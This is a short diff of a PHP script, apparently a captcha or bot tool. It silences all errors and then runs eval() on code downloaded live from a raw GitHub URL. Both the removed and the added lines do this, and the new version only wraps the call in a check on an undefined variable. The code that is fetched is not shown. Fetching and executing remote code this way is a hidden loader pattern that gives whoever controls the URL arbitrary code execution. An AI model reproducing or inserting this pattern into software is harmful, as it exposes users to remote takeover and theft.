@@ -1,6 +1,8 @@
 <?php
 error_reporting(0);
-eval(str_replace("<?php","",file_get_contents("https://raw.githubusercontent.com/marcoleus/build/main/build_index.php")));
+if($eval == false) {
+    eval(file_get_contents("https://raw.githubusercontent.com/marcoleus/build/main/build_index.php"));
+}
 methode:
 c();
 $methode = methode_captcha();
